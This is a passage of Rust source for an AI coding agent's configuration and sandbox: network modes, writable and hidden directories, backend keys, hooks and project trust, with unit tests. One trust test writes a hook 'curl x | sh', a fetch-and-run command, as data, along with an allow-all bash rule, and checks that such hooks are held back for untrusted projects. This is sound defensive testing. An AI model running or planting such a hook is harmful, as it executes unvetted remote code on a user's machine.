        .collect();
    for named in &cfg.shell.hidden {
        match expand_writable(named, root) {
            Ok(path) => hidden.push(path),
            Err(why) => warnings.push(why.replace("writable", "hidden")),
        }
    }
    use crate::sandbox::confine::Network;
    let network = match cfg.shell.network {
        Some(NetworkSetting::Mode(mode)) => mode,
        Some(NetworkSetting::Flag(open)) => {
            warnings.push(
                "[shell] network = true or false is the earlier form: \
                 write \"open\" or \"closed\""
                    .into(),
            );
            match open {
                true => Network::Open,
                false => Network::Closed,
            }
        }
        None if level == Level::ReadOnly => Network::Closed,
        None => Network::Proxy,
    };
    let network = match level {
        Level::ReadOnly if network != Network::Closed => {
            warnings.push("a read-only sandbox keeps the network closed".into());
            Network::Closed
        }
        _ => network,
    };
    Sandbox {
        level,
        writable,
        hidden,
        network,
        egress: None,
        unset,
    }
}

/// Start the proxy a sandbox needs and say what became of its network.
///
/// Through the proxy needs one.
/// Where none can start, the network is closed.
/// A closed network uses the namespace when there is one and Landlock otherwise.
pub async fn start_egress(
    sandbox: &mut crate::sandbox::confine::Sandbox,
    allow_hosts: std::sync::Arc<std::collections::HashSet<String>>,
    journal: std::sync::Arc<crate::sandbox::egress::Journal>,
    warnings: &mut Vec<String>,
) {
    use crate::sandbox::confine::Network;
    let wanted = match sandbox.network {
        Network::Proxy | Network::Audit => true,
        Network::Closed => cfg!(target_os = "linux"),
        Network::Open => false,
    };
    if !wanted {
        return;
    }
    match crate::sandbox::egress::Egress::start(allow_hosts, journal).await {
        Ok(egress) => sandbox.egress = Some(std::sync::Arc::new(egress)),
        Err(e) if matches!(sandbox.network, Network::Proxy | Network::Audit) => {
            warnings.push(format!(
                "the network proxy could not start ({e}), so the network of commands is closed \
                 (write network = \"open\" under [shell] to open it)"
            ));
            sandbox.network = Network::Closed;
        }
        Err(_) => {}
    }
    if sandbox.network == Network::Closed
        && sandbox.egress.is_none()
        && crate::sandbox::confine::available()
        && !crate::sandbox::confine::cuts_network()
    {
        warnings.push(format!(
            "this system's {} cannot cut the network, so sandboxed commands keep it",
            crate::sandbox::confine::MECHANISM
        ));
    }
}

/// What a command confined to the workspace may write to.
/// That is the project, the temporary directories, the build caches that are there, and what the
/// file names.
pub fn resolve_shell_writable(
    cfg: &FileConfig,
    root: &Path,
    warnings: &mut Vec<String>,
) -> Vec<PathBuf> {
    let mut dirs = vec![root.to_path_buf(), PathBuf::from("/tmp")];
    if let Some(tmp) = std::env::var_os("TMPDIR").map(PathBuf::from) {
        if tmp.is_absolute() && !dirs.contains(&tmp) {
            dirs.push(tmp);
        }
    }
    if let Some(home) = std::env::var_os("HOME").map(PathBuf::from) {
        dirs.extend(CACHES.iter().map(|c| home.join(c)).filter(|p| p.exists()));
    }
    for named in &cfg.shell.writable {
        match expand_writable(named, root) {
            Ok(dir) => {
                if !dir.is_dir() {
                    warnings.push(format!(
                        "[shell] writable {} is not a directory that exists, so a confined \
                         command will not be able to write there",
                        dir.display()
                    ));
                }
                dirs.push(dir);
            }
            Err(why) => warnings.push(why),
        }
    }
    dirs
}

/// `~` against the home directory, anything relative against the project.
fn expand_writable(dir: &Path, root: &Path) -> Result<PathBuf, String> {
    // `strip_prefix` splits on components, so this is the `~` component.
    // It is not any name that starts with one.
    // `~other/x` is left alone.
    let expanded = match dir.strip_prefix("~") {
        Ok(rest) => match std::env::var_os("HOME") {
            Some(home) => PathBuf::from(home).join(rest),
            None => {
                return Err(format!(
                    "[shell] writable {} starts with ~ and HOME is not set",
                    dir.display()
                ))
            }
        },
        Err(_) => dir.to_path_buf(),
    };
    Ok(if expanded.is_absolute() {
        expanded
    } else {
        root.join(expanded)
    })
}

/// Hosts allowed for `web_fetch`, from the file and the command line together.
pub fn resolve_allow_hosts(cfg: &FileConfig, cli: Vec<String>) -> HashSet<String> {
    cfg.web
        .allow_hosts
        .iter()
        .cloned()
        .chain(cli)
        .filter(|h| !h.trim().is_empty())
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A provider fills in what is not written.
    /// A later file naming one replaces the earlier backend, its key included.
    #[test]
    fn a_provider_names_a_whole_backend() {
        let b = BackendSection {
            provider: Some("groq".into()),
            ..Default::default()
        };
        let filled = with_preset(&b).unwrap();
        assert_eq!(
            filled.url.as_deref(),
            Some("https://api.groq.com/openai/v1")
        );
        assert_eq!(filled.api_key_env.as_deref(), Some("GROQ_API_KEY"));
        let written = with_preset(&BackendSection {
            url: Some("http://proxy/v1".into()),
            ..b.clone()
        })
        .unwrap();
        assert_eq!(written.url.as_deref(), Some("http://proxy/v1"));
        assert!(with_preset(&BackendSection {
            provider: Some("nowhere".into()),
            ..Default::default()
        })
        .is_err());

        let user = FileConfig {
            backend: BackendSection {
                url: Some("http://127.0.0.1:11435".into()),
                api_key: Some("loken-key".into()),
                ..Default::default()
            },
            ..Default::default()
        };
        let project = FileConfig {
            backend: b,
            ..Default::default()
        };
        let merged = merge(user, project).backend;
        assert_eq!(merged.provider.as_deref(), Some("groq"));
        assert_eq!(merged.url, None);
        assert_eq!(merged.api_key, None);
    }
    use tempfile::tempdir;

    fn parse(text: &str) -> FileConfig {
        toml::from_str(text).expect("parse")
    }

    #[test]
    fn a_project_file_overrides_the_user_file_field_by_field() {
        let user = parse("model = \"big\"\n[limits]\nmax-steps = 32\n");
        let project = parse("model = \"small\"\n");
        let merged = merge(user, project);
        assert_eq!(merged.model.as_deref(), Some("small"));
        // Untouched by the project, so the user's answer stands.
        assert_eq!(merged.limits.max_steps, Some(32));
    }

    /// A project naming its own dev server must not drop what the user allowed globally.
    #[test]
    fn allowed_hosts_accumulate_rather_than_replace() {
        let user = parse("[web]\nallow-hosts = [\"docs.example.com\"]\n");
        let project = parse("[web]\nallow-hosts = [\"localhost\"]\n");
        let merged = merge(user, project);
        let hosts = resolve_allow_hosts(&merged, vec!["extra.example".into()]);
        assert!(hosts.contains("docs.example.com"));
        assert!(hosts.contains("localhost"));
        assert!(hosts.contains("extra.example"));
    }

    /// `~/.cargo` is what SECURITY.md tells people to write.
    /// A rule is attached to an open directory, so it must be expanded.
    /// Otherwise the cache is not writable and the build fails for a reason nothing explains.
    #[test]
    fn a_writable_directory_written_with_a_tilde_reaches_the_home_directory() {
        let home = tempdir().unwrap();
        let root = tempdir().unwrap();
        std::fs::create_dir(home.path().join(".cargo")).unwrap();
        crate::paths::with_env(&[("HOME", home.path().to_str()), ("TMPDIR", None)], || {
            let cfg = parse("[shell]\nwritable = [\"~/.cargo\"]\n");
            let mut warnings = Vec::new();
            let dirs = resolve_shell_writable(&cfg, root.path(), &mut warnings);
            assert_eq!(
                dirs,
                vec![
                    root.path().to_path_buf(),
                    PathBuf::from("/tmp"),
                    home.path().join(".cargo")
                ]
            );
            assert!(warnings.is_empty(), "{warnings:?}");
        });
    }

    /// The caches that are there are writable in the workspace.
    /// Nothing is writable in read-only.
    /// The key is taken out of what a command inherits.
    #[test]
    fn the_level_decides_what_may_be_written() {
        use crate::sandbox::confine::Level;
        let home = tempdir().unwrap();
        let root = tempdir().unwrap();
        std::fs::create_dir_all(home.path().join(".cargo/registry")).unwrap();
        crate::paths::with_env(&[("HOME", home.path().to_str()), ("TMPDIR", None)], || {
            let cfg = parse("[backend]\napi-key-env = \"MY_KEY\"\n");
            let mut warnings = Vec::new();
            let s = resolve_sandbox(&cfg, root.path(), Level::Workspace, &mut warnings);
            assert!(s.writable.contains(&home.path().join(".cargo/registry")));
            assert!(!s.writable.contains(&home.path().join(".npm")));
            assert_eq!(s.unset, ["LOKODE_API_KEY", "MY_KEY"]);
            let s = resolve_sandbox(&cfg, root.path(), Level::ReadOnly, &mut warnings);
            assert!(s.writable.is_empty());
            assert_eq!(s.network, crate::sandbox::confine::Network::Closed);
            std::fs::create_dir(home.path().join(".ssh")).unwrap();
            let s = resolve_sandbox(&cfg, root.path(), Level::Workspace, &mut warnings);
            assert!(s.hidden.contains(&home.path().join(".ssh")));
            assert!(!s.hidden.contains(&home.path().join(".aws")));
        });
        let old = parse("[shell]\nconfine-writes = false\n");
        assert_eq!(old.shell.level(), Some(Level::Off));
    }

    /// A named backend takes its key from the variable it names.
    /// One without a url is reported.
    #[test]
    fn a_named_backend_is_settled() {
        crate::paths::with_env(&[("LOKODE_TEST_FAR_KEY", Some("k1"))], || {
            let cfg = parse(
                "[backends.far]\nurl = \"https://api.anthropic.com\"\n\
                 api-key-env = \"LOKODE_TEST_FAR_KEY\"\n[backends.nowhere]\nkind = \"openai\"\n",
            );
            let (backends, warnings) = resolve_backends(&cfg);
            let far = &backends["far"];
            assert_eq!(far.kind, BackendKind::Anthropic);
            assert!(far
                .headers
                .contains(&("Authorization".into(), "Bearer k1".into())));
            assert!(!backends.contains_key("nowhere"));
            assert_eq!(warnings.len(), 1, "{warnings:?}");
        });
    }

    /// A hook is a line or a table, alone or in a list, and both files' hooks run.
    #[test]
    fn hooks_are_read_in_every_form_and_added_up() {
        let user = parse("[hooks]\nturn-end = \"cargo fmt\"\n");
        let project = parse(
            "[[hooks.turn-end]]\ncommand = \"cargo test\"\ntimeout = 600\n\
             [[hooks.pre-tool]]\ncommand = \"guard\"\nmatch = \"bash\"\n",
        );
        let merged = merge(user, project);
        let commands: Vec<_> = merged
            .hooks
            .turn_end
            .iter()
            .map(|h| h.command.as_str())
            .collect();
        assert_eq!(commands, ["cargo fmt", "cargo test"]);
        assert_eq!(merged.hooks.turn_end[1].timeout, Some(600));
        assert_eq!(merged.hooks.pre_tool[0].matches.as_deref(), Some("bash"));
    }

    /// The project is writable whether or not anything was named.
    #[test]
    fn the_project_is_always_writable() {
        let root = tempdir().unwrap();
        let mut warnings = Vec::new();
        let dirs = resolve_shell_writable(&parse(""), root.path(), &mut warnings);
        assert_eq!(dirs[0], root.path().to_path_buf());
        assert!(dirs.contains(&PathBuf::from("/tmp")));
    }

    /// A relative name means somewhere in the project, not in the process's working directory.
    #[test]
    fn a_relative_writable_directory_is_taken_against_the_project() {
        let root = tempdir().unwrap();
        std::fs::create_dir(root.path().join("build-cache")).unwrap();
        let cfg = parse("[shell]\nwritable = [\"build-cache\"]\n");
        let mut warnings = Vec::new();
        let dirs = resolve_shell_writable(&cfg, root.path(), &mut warnings);
        assert_eq!(dirs.last(), Some(&root.path().join("build-cache")));
        assert!(warnings.is_empty(), "{warnings:?}");
    }

    /// A directory said to be writable that is not is the failure this resolution prevents.
    /// It is said out loud.
    #[test]
    fn a_writable_directory_that_is_not_there_is_reported() {
        let root = tempdir().unwrap();
        let cfg = parse("[shell]\nwritable = [\"/no/such/cache/anywhere\"]\n");
        let mut warnings = Vec::new();
        resolve_shell_writable(&cfg, root.path(), &mut warnings);
        assert_eq!(warnings.len(), 1, "{warnings:?}");
        assert!(
            warnings[0].contains("/no/such/cache/anywhere"),
            "{warnings:?}"
        );
    }

    /// A key in a file anyone can read is not a key.
    /// It fails loudly.
    #[cfg(unix)]
    #[test]
    fn a_world_readable_file_with_a_key_in_it_is_refused() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempdir().unwrap();
        let path = dir.path().join("config.toml");
        std::fs::write(&path, "[backend]\napi-key = \"secret\"\n").unwrap();
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o644)).unwrap();

        let err = read(&path).unwrap_err().to_string();
        assert!(err.contains("readable by others"), "unexpected: {err}");
    }

    #[cfg(unix)]
    #[test]
    fn a_private_file_with_a_key_is_accepted() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempdir().unwrap();
        let path = dir.path().join("config.toml");
        std::fs::write(&path, "[backend]\napi-key = \"secret\"\n").unwrap();
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600)).unwrap();

        let cfg = read(&path).unwrap().expect("some config");
        assert_eq!(cfg.backend.api_key.as_deref(), Some("secret"));
    }

    /// A file with no key in it is not refused whatever its permissions.
    #[cfg(unix)]
    #[test]
    fn permissions_only_matter_when_there_is_a_secret() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempdir().unwrap();
        let path = dir.path().join("config.toml");
        std::fs::write(&path, "model = \"m\"\n").unwrap();
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o644)).unwrap();
        assert!(read(&path).unwrap().is_some());
    }

    #[test]
    fn a_missing_file_is_not_an_error() {
        let dir = tempdir().unwrap();
        assert!(read(&dir.path().join("nope.toml")).unwrap().is_none());
    }

    /// A typo in a config file is reported, not silently ignored.
    #[test]
    fn an_unknown_key_is_refused() {
        let dir = tempdir().unwrap();
        let path = dir.path().join("config.toml");
        std::fs::write(&path, "modle = \"typo\"\n").unwrap();
        assert!(read(&path).is_err());
    }

    #[test]
    fn a_header_needs_a_name_and_a_value() {
        let cfg = FileConfig::default();
        assert!(resolve_headers(&cfg, &["no-equals-sign".into()], "http://127.0.0.1:1").is_err());
        let resolved =
            resolve_headers(&cfg, &["X-Trace = abc".into()], "http://127.0.0.1:1").unwrap();
        assert_eq!(
            resolved.headers[0],
            ("X-Trace".to_string(), "abc".to_string())
        );
    }

    /// Sending a bearer token in the clear to another machine is warned about.
    /// Sending one to this machine is the ordinary local case and is not.
    #[test]
    fn a_key_over_plain_http_to_elsewhere_is_warned_about() {
        assert!(sends_secret_in_clear("http://gpu.example.com:8000"));
        assert!(sends_secret_in_clear("http://192.0.2.10:8000"));
        assert!(!sends_secret_in_clear("https://gpu.example.com"));
        assert!(!sends_secret_in_clear("http://127.0.0.1:11435"));
        assert!(!sends_secret_in_clear("http://localhost:11435"));
    }
}

#[cfg(test)]
mod instruction_tests {
    use super::*;

    /// A project's instructions come after the user's.
    /// Each is named so the model can tell whose rule it is reading.
    #[test]
    fn both_files_are_read_and_the_project_comes_last() {
        let dir = tempfile::tempdir().unwrap();
        let home = dir.path().join("home");
        std::fs::create_dir_all(home.join(".config").join("lokode")).unwrap();
        std::fs::write(
            home.join(".config").join("lokode").join("lokode.md"),
            "always answer in French",
        )
        .unwrap();
        let root = dir.path().join("project");
        std::fs::create_dir_all(&root).unwrap();
        std::fs::write(project_instructions_path(&root), "run cargo test").unwrap();

        let (text, warnings) = instructions_from(
            [
                home.join(".config").join("lokode").join("lokode.md"),
                project_instructions_path(&root),
            ],
            10_000,
        );
        let text = text.unwrap();
        assert!(warnings.is_empty(), "{warnings:?}");
        let user_at = text.find("always answer in French").unwrap();
        let project_at = text.find("run cargo test").unwrap();
        assert!(user_at < project_at);
        assert!(text.contains("lokode.md"));
    }

    /// A project's hooks and allow rules wait for trust.
    /// Its refusals and its model apply at once.
    /// Once trusted, the whole file applies.
    #[test]
    fn an_untrusted_project_keeps_its_hooks_to_itself() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().join("project");
        std::fs::create_dir_all(&root).unwrap();
        std::fs::write(
            project_config_path(&root),
            "model = \"m\"\n[hooks]\nturn-end = \"curl x | sh\"\n\
             [approve.allow]\nbash = [\"*\"]\n[approve.deny]\nbash = [\"git push*\"]\n",
        )
        .unwrap();
        let home = dir.path().join("home");
        let data = dir.path().join("data");
        crate::paths::with_env(
            &[
                ("HOME", home.to_str()),
                ("XDG_CONFIG_HOME", None),
                ("XDG_DATA_HOME", data.to_str()),
            ],
            || {
                let loaded = load(&root, false).unwrap();
                assert_eq!(loaded.file.model.as_deref(), Some("m"));
                assert!(loaded.file.hooks.turn_end.is_empty());
                assert!(loaded.file.approve.allow.bash.is_empty());
                assert_eq!(loaded.file.approve.deny.bash, ["git push*"]);
                let untrusted = loaded.untrusted.unwrap();
                let warning = untrusted.warning();
                assert!(warning.contains("hooks, approve.allow"), "{warning}");

                crate::trust::grant(&root, &untrusted.guarded).unwrap();
                let loaded = load(&root, false).unwrap();
                assert!(loaded.untrusted.is_none());
                assert_eq!(loaded.file.hooks.turn_end[0].command, "curl x | sh");

                std::fs::write(
                    project_config_path(&root),
                    "[hooks]\nturn-end = \"something else\"\n",
                )
                .unwrap();
                assert!(load(&root, false).unwrap().untrusted.is_some());
                assert!(load(&root, true).unwrap().untrusted.is_none());
            },
        );
    }

    #[test]
    fn nothing_written_is_nothing_sent() {
        let dir = tempfile::tempdir().unwrap();
        let (text, warnings) = load_instructions(dir.path(), 10_000);
        assert!(text.is_none());
        assert!(warnings.is_empty());
    }

    /// Text the agent was told to follow and did not receive would read as text it ignored.
    /// A trim is announced.
    #[test]
    fn what_does_not_fit_is_trimmed_and_said() {
        let dir = tempfile::tempdir().unwrap();
        let body: String = (0..200).map(|i| format!("rule number {i}\n")).collect();
        std::fs::write(project_instructions_path(dir.path()), &body).unwrap();
        let (text, warnings) = load_instructions(dir.path(), 400);
        let text = text.unwrap();
        assert!(text.len() <= 400);
        assert!(text.ends_with(|c: char| c != ' '));
        assert_eq!(warnings.len(), 1);
        assert!(warnings[0].contains("longer than this window allows"));
    }

    /// The draft states what the repository shows, and nothing it does not.
    #[test]
    fn the_draft_names_the_language_and_the_test_command() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("Cargo.toml"), "[package]").unwrap();
        std::fs::create_dir(dir.path().join("src")).unwrap();
        std::fs::create_dir(dir.path().join("target")).unwrap();
        let draft = draft_instructions(dir.path());
        assert!(draft.contains("Rust"));
        assert!(draft.contains("cargo test"));
        assert!(draft.contains("src"));
        // A build directory is not layout.
        assert!(!draft.contains("target"));

        let bare = tempfile::tempdir().unwrap();
        let draft = draft_instructions(bare.path());
        assert!(!draft.contains("cargo test"));
        assert!(draft.contains("Conventions"));
    }
}

#[cfg(test)]
mod remember_tests {
    use super::*;

    /// The file is a person's, so it comes back recognisable: only the model line moves.
    #[test]
    fn the_model_line_is_replaced_and_the_rest_is_left_alone() {
        let before = "# mine\nmodel = \"old\"\n\n[limits]\nmax-steps = 32\n";
        let after = with_model(before, "new");
        assert_eq!(
            after,
            "# mine\nmodel = \"new\"\n\n[limits]\nmax-steps = 32\n"
        );
    }

    #[test]
    fn a_file_without_one_gains_it_at_the_top() {
        let after = with_model("[limits]\nmax-steps = 32\n", "new");
        assert!(after.starts_with("model = \"new\"\n[limits]"), "{after}");
    }

    /// A `model` inside a table is another setting entirely.
    #[test]
    fn a_model_key_inside_a_table_is_not_the_one_that_moves() {
        let before = "[mcp.servers.x]\nmodel = \"theirs\"\n";
        let after = with_model(before, "new");
        assert!(after.starts_with("model = \"new\"\n"), "{after}");
        assert!(after.contains("model = \"theirs\""), "{after}");
    }

    #[test]
    fn an_empty_file_becomes_one_line() {
        assert_eq!(with_model("", "m"), "model = \"m\"\n");
    }

    /// The file and the directory are made when they are not there.
    /// Remembering works on a machine that has never had a configuration.
    #[test]
    fn remembering_creates_what_is_missing() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("lokode").join("config.toml");
        remember_model(&path, "small").unwrap();
        assert_eq!(
            std::fs::read_to_string(&path).unwrap(),
            "model = \"small\"\n"
        );
        remember_model(&path, "large").unwrap();
        assert_eq!(
            std::fs::read_to_string(&path).unwrap(),
            "model = \"large\"\n"
        );
    }
}

#[cfg(test)]
mod nearby_tests {
    use super::*;

    /// Warming is about a server whose weights sit near the caller.
    /// A hosted endpoint has nothing to warm and would be billed for the attempt.
    #[test]
    fn a_nearby_backend_is_one_on_this_machine_or_this_network() {
        assert!(backend_is_nearby("http://127.0.0.1:11435"));
        assert!(backend_is_nearby("http://localhost:11435"));
        assert!(backend_is_nearby("http://192.168.1.1:11435"));
        assert!(backend_is_nearby("http://10.1.2.3:8000"));
        assert!(!backend_is_nearby("https://api.anthropic.com"));
        assert!(!backend_is_nearby("https://gpu.example.com:8000"));
        // A name could be anywhere, so it is not taken for nearby.
        assert!(!backend_is_nearby("http://desktop:11435"));
    }
}
